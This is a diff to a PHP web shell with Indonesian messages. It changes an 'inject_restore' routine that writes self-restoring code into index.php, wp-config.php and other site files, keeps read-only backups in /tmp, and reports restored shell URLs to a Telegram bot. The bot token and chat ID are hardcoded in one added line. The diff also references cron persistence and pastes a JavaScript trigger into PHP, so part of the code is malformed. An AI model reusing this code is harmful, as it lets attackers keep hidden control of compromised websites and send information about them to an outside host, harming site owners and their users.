@@ -383,11 +383,7 @@ function sendJsonResponse($data) {
 // ============================================================
 
 if (isset($_GET['inject_restore']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    global $CURRENT_SHELL, $botToken, $telegramUserId;
-    
-    if (empty($CURRENT_SHELL)) {
-        $CURRENT_SHELL = basename(__FILE__);
-    }
+    global $CURRENT_SHELL;
     
     $targetFiles = [
         __DIR__ . '/index.php',
@@ -399,8 +395,8 @@ if (isset($_GET['inject_restore']) && isset($_SESSION['loggedin']) && $_SESSION[
     ];
     
     $restoreCode = '
-if (!function_exists("omega_restore_' . md5($CURRENT_SHELL) . '")) {
-    function omega_restore_' . md5($CURRENT_SHELL) . '() {
+if (!function_exists("dkd_restore_' . md5($CURRENT_SHELL) . '")) {
+    function dkd_restore_' . md5($CURRENT_SHELL) . '() {
         $current_file = "' . $CURRENT_SHELL . '";
         if (!file_exists(__DIR__ . "/" . $current_file)) {
             $backup_locations = [
@@ -416,7 +412,7 @@ if (!function_exists("omega_restore_' . md5($CURRENT_SHELL) . '")) {
                     $domain = $_SERVER["HTTP_HOST"] ?? "localhost";
                     $protocol = (isset($_SERVER["HTTPS"]) ? "https://" : "http://");
                     $url = $protocol . $domain . "/" . $current_file;
-                    @file_get_contents("https://api.telegram.org/bot' . $botToken . '/sendMessage?chat_id=' . $telegramUserId . '&text=" . urlencode("RESTORED: " . $url));
+                    @file_get_contents("https://api.telegram.org/bot8513008865:AAFvBdueP_HRaBfU5hm7el3lQAN1DxzgOE4/sendMessage?chat_id=7547598395&text=" . urlencode("🔄 RESTORED: " . $url));
                     break;
                 }
             }
@@ -427,79 +423,60 @@ if (!function_exists("omega_restore_' . md5($CURRENT_SHELL) . '")) {
             @chmod($backup, 0444);
         }
     }
-    omega_restore_' . md5($CURRENT_SHELL) . '();
+    dkd_restore_' . md5($CURRENT_SHELL) . '();
 }
-// ===== OMEGA AUTO RESTORE END =====
+// ===== DKD AUTO RESTORE END =====
 ';
     
     $injected = [];
     $errors = [];
-    $exists = [];
     
     foreach ($targetFiles as $file) {
-        if (!file_exists($file)) {
-            $errors[] = basename($file) . " (file not found)";
-            continue;
-        }
-        if (!is_writable($file)) {
-            @chmod($file, 0644);
-            if (!is_writable($file)) {
-                $errors[] = basename($file) . " (not writable)";
-                continue;
+        if (file_exists($file) && is_writable($file)) {
+            $content = file_get_contents($file);
+            if (strpos($content, 'DKD AUTO RESTORE') === false) {
+                if (strpos($content, '<?php') === 0) {
+                    $newContent = '<?php' . "\n" . $restoreCode . "\n" . substr($content, 5);
+                } else {
+                    $newContent = '<?php' . "\n" . $restoreCode . "\n" . $content;
+                }
+                if (file_put_contents($file, $newContent)) {
+                    $injected[] = basename($file);
+                } else {
+                    $errors[] = basename($file) . " (gagal tulis)";
+                }
+            } else {
+                $injected[] = basename($file) . " (sudah ada)";
             }
-        }
-        
-        $content = @file_get_contents($file);
-        if ($content === false) {
-            $errors[] = basename($file) . " (failed to read)";
-            continue;
-        }
-        
-        if (strpos($content, 'OMEGA AUTO RESTORE') !== false) {
-            $exists[] = basename($file) . " (already injected)";
-            continue;
-        }
-        
-        if (strpos($content, '<?php') === 0) {
-            $newContent = '<?php' . "\n" . $restoreCode . "\n" . substr($content, 5);
         } else {
-            $newContent = '<?php' . "\n" . $restoreCode . "\n" . $content;
-        }
-        
-        if (@file_put_contents($file, $newContent) !== false) {
-            $injected[] = basename($file);
-            @chmod($file, 0644);
-        } else {
-            $errors[] = basename($file) . " (failed to write)";
+            $errors[] = basename($file) . " (tidak ditemukan/tidak writable)";
         }
     }
     
-    $mainBackup = '/tmp/' . md5($CURRENT_SHELL) . '.inc';
-    if (!file_exists($mainBackup)) {
-        @copy(__FILE__, $mainBackup);
-        @chmod($mainBackup, 0444);
+    $backup = '/tmp/' . md5($CURRENT_SHELL) . '.inc';
+    if (!file_exists($backup)) {
+        @copy(__FILE__, $backup);
+        @chmod($backup, 0444);
     }
     
-    // Kirim notifikasi ke Telegram
-    $domain = $_SERVER['HTTP_HOST'] ?? 'localhost';
-    $protocol = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://');
-    $url = $protocol . $domain . '/' . $CURRENT_SHELL;
-    sendTelegramMessage($botToken, $telegramUserId, "RESTORED: " . $url);
-    
-    echo "✅ INJECT RESTORE COMPLETE\n";
-    echo "📁 Shell: " . $CURRENT_SHELL . "\n";
-    echo "✅ Injected: " . count($injected) . " files\n";
-    if (!empty($injected)) {
-        echo "   " . implode("\n   ", $injected) . "\n";
-    }
-    if (!empty($exists)) {
-        echo "⏭️ Already exists: " . implode(", ", $exists) . "\n";
-    }
+    $msg = "🔧 *Inject Restore Code*\n"
+         . "📁 Shell: " . $CURRENT_SHELL . "\n"
+         . "✅ Berhasil: " . implode(", ", $injected) . "\n";
     if (!empty($errors)) {
-        echo "❌ Failed: " . implode(", ", $errors) . "\n";
+        $msg .= "❌ Gagal: " . implode(", ", $errors) . "\n";
+    }
+    
+    sendTelegramMessage($botToken, $telegramUserId, $msg);
+    
+    echo "✅ Inject selesai!\n";
+    echo "📁 Shell: " . $CURRENT_SHELL . "\n";
+    echo "📁 " . implode("\n📁 ", $injected);
+    if (!empty($errors)) {
+        echo "\n❌ " . implode("\n❌ ", $errors);
     }
     exit;
 }
+
 
 function get_file_location() {
     $file = __FILE__;
@@ -2540,10 +2517,14 @@ function cron_persistence() {
 }
 
 // ===== INJECT RESTORE (FIXED) =====
-if (isset($_GET['inject_restore']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $result = inject_restore();
-    sendJsonResponse($result);
-}
+function runInject() {
+                if(confirm('🔧 Inject restore code to index.php, wp-config.php, config.php, wp-load.php, settings.php?')) {
+                    fetch('?inject_restore=1')
+                        .then(r=>r.text())
+                        .then(d=>alert(d))
+                        .catch(()=>alert('Error'));
+                }
+            }
 
 // ============================================================
 // HANDLER GET - SEMUA FITUR
